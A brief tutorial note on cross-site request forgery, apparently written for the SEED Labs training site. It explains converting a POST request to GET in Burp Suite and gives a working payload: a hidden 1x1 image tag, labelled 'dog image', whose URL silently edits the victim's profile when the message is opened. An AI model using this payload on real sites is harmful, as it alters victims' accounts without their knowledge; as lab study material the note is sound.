
# Cross-Site Request Forgery

Unauthorized access to change some information (like password) of an user account. (Do a malicious request that execute the victim)

----

1. Try to change the post method, sending a get method (in repeater burpsuite you can **change request method**), and the request works

2. you have to put the data of the other profile like id.... Remember you can try to delete unnecessary data in the request

3. Send a message to the other user with the url obtained in burpsuite:

If you can send the message with html you can try this:

````html
<img src="http://www.seed-server.com/action/profile/edit?name=Hacked&description=&accesslevel%5bdescription%5d=2&briefdescription=&accesslevel%5bbriefdescription%5d=2&location=&accesslevel%5blocation%5d=2&interests=&accesslevel%5binterests%5d=2&skills=&accesslevel%5bskills%5d=2&contactemail=&accesslevel%5bcontactemail%5d=2&phone=&accesslevel%5bphone%5d=2&mobile=&accesslevel%5bmobile%5d=2&website=&accesslevel%5bwebsite%5d=2&twitter=&accesslevel%5btwitter%5d=2&guid=56" alt="dog image" width="1" height="1" />
````

See that you send a fake image, in alt parameter you indicate that is a "dog image" and width="1" and height="1". This make that the other user don't see the image break

If the user open the message, the name of the account change. This is because he is doing the action to change the name in the background

---

# Tags

#csrf #xsrf #vulnerabilty

---